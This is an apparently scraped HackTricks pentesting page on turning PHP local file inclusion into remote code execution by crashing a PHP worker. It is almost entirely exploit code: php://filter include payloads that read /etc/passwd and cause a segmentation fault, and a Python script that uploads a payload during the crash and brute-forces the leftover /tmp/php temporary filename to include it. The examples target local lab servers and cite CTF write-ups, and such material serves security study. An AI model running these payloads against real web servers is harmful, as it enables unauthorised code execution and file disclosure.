---
title: "LFI2RCE via Segmentation Fault"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/file-inclusion/lfi2rce-via-segmentation-fault.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

```
// PHP 7.0
include("php://filter/string.strip_tags/resource=/etc/passwd");
// PHP 7.2
include("php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA");
```
```
# Upload a file while triggering the segmentation fault.
import requests
url = "http://localhost:8008/index.php?i=php://filter/string.strip_tags/resource=/etc/passwd"
with open("la.php", "rb") as payload:
    try:
        requests.post(url, files={"file": payload})
    except requests.RequestException:
        pass  # The deliberately crashed worker may drop the connection.
# Search for a six-character PHP temporary-file suffix.
import itertools
import string
charset = string.ascii_letters + string.digits
base_url = "http://127.0.0.1:8008"
# This exhaustive 62^6 loop is intentionally simple and can take a very long time.
for chars in itertools.product(charset, repeat=6):
    suffix = "".join(chars)
    candidate = f"{base_url}/index.php?i=/tmp/php{suffix}"
    response = requests.get(candidate, timeout=5)
    if b"spyd3r" in response.content:
        print(f"[+] Include succeeded: {candidate}")
        break
```
## References

- [1] [One Line PHP Challenge and the Return of One Line PHP Challenge writeup](https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/)
- [2] [PHP segmentation fault via php://filter chains (HackMD writeup)](https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view)
- [3] [PHP manual: POST method uploads](https://www.php.net/manual/en/features.file-upload.post-method.php)
- [4] [Docker Hub: `easyengine/php7.0`](https://hub.docker.com/r/easyengine/php7.0)
